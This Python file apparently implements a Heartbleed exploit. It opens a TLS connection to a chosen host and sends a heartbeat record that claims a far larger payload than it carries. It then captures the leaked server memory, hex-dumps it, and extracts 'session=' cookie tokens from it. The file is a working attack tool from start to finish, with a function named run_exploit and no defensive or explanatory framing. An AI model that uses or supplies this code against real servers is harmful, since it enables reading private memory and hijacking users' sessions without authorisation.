import socket
import struct
import select
import time

# Verified TLS 1.1 ClientHello — extensions parsed and confirmed correct.
CLIENT_HELLO = bytes.fromhex(
    "16030200df010000db0302"
    "53435b909d9b720bbc0cbc2b92a84897cfbd3904cc160a8503909f770433d4de"
    "000066"
    "c014c00ac022c0210039003800880087c00fc00500350084c012c008c01cc01b"
    "00160013c00dc003000ac013c009c01fc01e00330032009a009900450044c00e"
    "c004002f00960041c011c007c00cc002000500040015001200090014001100080006000300ff"
    "0100"
    "004c"
    "ff01000100"
    "000a00340032000e000d0019000b000c00180009000a00160017000800060007"
    "001400150004000500120013000100020003000f001000110"
    "00b0002010000230000000f000101"
)

HEARTBEAT = bytes([0x18, 0x03, 0x02, 0x00, 0x04, 0x01, 0x40, 0x00, 0x41])


def _recvall(sock, length, timeout=5):
    deadline = time.time() + timeout
    buf = b""
    while len(buf) < length:
        remaining = deadline - time.time()
        if remaining <= 0:
            return buf if buf else None
        ready, _, _ = select.select([sock], [], [], remaining)
        if sock not in ready:
            return buf if buf else None
        chunk = sock.recv(length - len(buf))
        if not chunk:
            return buf if buf else None
        buf += chunk
    return buf


def _recv_tls_record(sock, timeout=10):
    header = _recvall(sock, 5, timeout=timeout)
    if not header or len(header) < 5:
        return None, None, None
    rec_type, version, length = struct.unpack(">BHH", header)
    payload = _recvall(sock, length, timeout=timeout)
    return rec_type, version, payload or b""


def _do_handshake(sock):
    sock.send(CLIENT_HELLO)
    while True:
        rec_type, version, payload = _recv_tls_record(sock)
        if rec_type is None:
            return None
        if rec_type == 21:   # alert during handshake
            return None
        if rec_type == 22 and payload and payload[0] == 0x0E:
            return version


def run_exploit(host, port=443):
    result = {
        "vulnerable": False,
        "raw_bytes": b"",
        "raw_length": 0,
        "hex_dump": "",
        "found_tokens": [],
        "error": None,
    }
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, int(port)))

        tls_version = _do_handshake(sock)
        if tls_version is None:
            result["error"] = "TLS handshake failed — server did not complete hello."
            return result

        # Match the heartbeat record version to what was negotiated
        ver_hi = (tls_version >> 8) & 0xFF
        ver_lo = tls_version & 0xFF
        heartbeat = bytes([0x18, ver_hi, ver_lo, 0x00, 0x04, 0x01, 0x40, 0x00, 0x41])
        sock.send(heartbeat)

        for _ in range(20):
            rec_type, _, payload = _recv_tls_record(sock)
            if rec_type is None:
                result["error"] = "No heartbeat response — server may have closed the connection."
                break
            if rec_type == 24:
                if len(payload) > 3:
                    result["vulnerable"]   = True
                    result["raw_bytes"]    = payload
                    result["raw_length"]   = len(payload)
                    result["hex_dump"]     = _format_hex(payload)
                    result["found_tokens"] = _extract_tokens(payload)
                else:
                    result["error"] = "Server responded but returned no extra data (patched)."
                break
            if rec_type == 21:
                result["error"] = "Server sent a TLS alert — heartbeat extension not negotiated."
                break

    except Exception as exc:
        result["error"] = str(exc)
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass
    return result


def _format_hex(data):
    lines = []
    for i in range(0, min(len(data), 2048), 16):
        chunk = data[i:i + 16]
        hex_part = " ".join(f"{b:02X}" for b in chunk).ljust(48)
        asc_part = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
        lines.append(f"{i:04X}:  {hex_part}  {asc_part}")
    if len(data) > 2048:
        lines.append(f"... ({len(data) - 2048} more bytes truncated)")
    return "\n".join(lines)


def _extract_tokens(data):
    tokens = []
    try:
        text = data.decode("latin-1")
        idx = 0
        while True:
            pos = text.find("session=", idx)
            if pos == -1:
                break
            end = pos + 8
            while end < len(text) and (text[end].isalnum() or text[end] in "-_"):
                end += 1
            token = text[pos + 8:end]
            if len(token) >= 8:
                tokens.append(token)
            idx = pos + 1
    except Exception:
        pass
    return tokens
